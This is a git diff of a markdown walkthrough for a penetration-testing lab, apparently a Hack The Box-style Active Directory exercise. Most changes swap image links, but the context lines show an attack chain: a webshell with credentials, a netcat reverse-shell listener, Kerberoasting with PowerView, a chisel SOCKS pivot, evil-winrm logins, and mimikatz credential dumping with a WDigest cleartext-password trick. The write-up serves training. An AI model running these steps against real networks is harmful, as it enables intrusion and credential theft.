@@ -44,8 +44,8 @@ External network 10.129.0.0/16
 ## 1. Foothold — from webshell to reverse shell
 
 We start with the credentials `admin:My_W3bsH3ll_P@ssw0rd!` for the antak webshell left by a colleague in `/uploads`.
+<img width="1227" height="748" alt="antak_webshell" src="https://github.com/user-attachments/assets/8d9bfdcb-ab57-47a0-892d-c62425836c72" />
 
-![The antak webshell on WEB-WIN01, accessible at /uploads/antak.aspx](antak_webshell.png)
 
 A webshell is convenient but "blind" (one command at a time). We want a real interactive shell, without Metasploit:
 
@@ -60,7 +60,8 @@ nc -lvnp 4466
 # then from the webshell: C:\shell.exe
 ```
 
-![Reverse shell caught on the netcat listener from WEB-WIN01](shell.png)
+<img width="633" height="245" alt="shell" src="https://github.com/user-attachments/assets/ba2fd1cf-88b3-4c1e-ad45-c29a6cd69aac" />
+
 
 Once inside, type `powershell` to access native cmdlets.
 
@@ -76,9 +77,10 @@ net accounts /domain                # lockout = Never -> you can try without loc
 ipconfig                            # <- key: the machine is dual-homed
 ```
 
-`ipconfig` reveals two networks: `10.129.0.0/16` (external, where you came from) and `172.16.6.0/16` (internal, where AD lives). **WEB-WIN01 is the bridge between the two networks.**
+`
 
-![ipconfig on WEB-WIN01 showing the two interfaces: 10.129.58.139 (external) and 172.16.6.100 (internal AD)](dual-homed-ipconfig.png)
+<img width="658" height="377" alt="dual-homed-ipconfig" src="https://github.com/user-attachments/assets/518b056b-4a92-4ef0-8174-f26f0223d23c" />
+
 
 Internal host discovery in pure PowerShell (no external tools):
 
@@ -86,7 +88,8 @@ Internal host discovery in pure PowerShell (no external tools):
 6..7 | % { $i=$_; 1..254 | % { if(Test-Connection "172.16.$i.$_" -Count 1 -Quiet){ "172.16.$i.$_ UP" } } }
 ```
 
-![Pure-PowerShell host discovery revealing 172.16.6.3 (DC) and 172.16.6.50 (MS01)](host-discovery.png)
+<img width="917" height="98" alt="host-discovery" src="https://github.com/user-attachments/assets/8abd56d9-39d2-4cb4-bfbe-7a2ff6bed8e2" />
+
 
 Found `172.16.6.3` (DC), `172.16.6.50` (MS01), `172.16.6.100` (yourself).
 
@@ -109,7 +112,8 @@ Get-DomainUser * -spn | select samaccountname,serviceprincipalname
 Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
 ```
 
-![Enumerating SPN accounts with PowerView and requesting svc_sql's TGS hash](kerberoasting-evidence.png)
+<img width="1443" height="820" alt="kerberoasting-evidence" src="https://github.com/user-attachments/assets/3ec2ff56-7ee0-458d-b1b6-13f4876dbb55" />
+
 
 You get the `$krb5tgs$23$*svc_sql$...` hash. On a GPU-less Kali use **John**, preserving the **asterisks** in the krb5tgs hash:
 
@@ -150,7 +154,8 @@ On Kali (client) — the IP is WEB-WIN01's **external** one (`10.129.x.x`, from 
 chisel client 10.129.x.x:1234 socks   # opens SOCKS on 127.0.0.1:1080
 ```
 
-![chisel server on the target and chisel client on Kali: SOCKS tunnel established on 127.0.0.1:1080](setting-up-chisel.png)
+<img width="1907" height="318" alt="setting-up-chisel" src="https://github.com/user-attachments/assets/2b8fbe5f-2afa-4402-9ae8-39b30f25196c" />
+
 
 Then set `socks5 127.0.0.1 1080` in `/etc/proxychains.conf`. From here, prefix every command aimed at the internal network with `proxychains`.
 
@@ -171,7 +176,8 @@ proxychains evil-winrm -i 172.16.6.50 -u svc_sql -p lucky7
 `upload /tmp/mimikatz/x64/mimikatz.exe mimikatz.exe`
 {% endhint %}
 
-![Uploading mimikatz.exe into the evil-winrm session on MS01](upload-mimikatz.png)
+<img width="866" height="232" alt="upload-mimikatz" src="https://github.com/user-attachments/assets/a0e12577-192a-48a1-99cf-9257316dcfe2" />
+
 
 **Important caveat:** mimikatz via evil-winrm almost always fails (`sekurlsa` empty, `privilege::debug` → `RtlAdjustPrivilege c0000061`), because WinRM is a network session with no context to read LSASS. The reliable route is **RDP**:
 
@@ -185,7 +191,8 @@ Inside RDP, run:
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
 
-![mimikatz sekurlsa::logonpasswords output on MS01: tpetty's NTLM hash and, after the WDigest trick, the cleartext password](mimikatz-wdigest.png)
+<img width="945" height="811" alt="mimikatz-wdigest" src="https://github.com/user-attachments/assets/42fafa4b-cb0b-444c-b181-ef8b90b5686f" />
+
 
 On the first pass you only get the NTLM hash. Here's the **WDigest trick**: by forcing that legacy protocol, Windows keeps passwords in cleartext in memory. Enable it, reboot, and on tpetty's next authentication you capture it in cleartext:
 
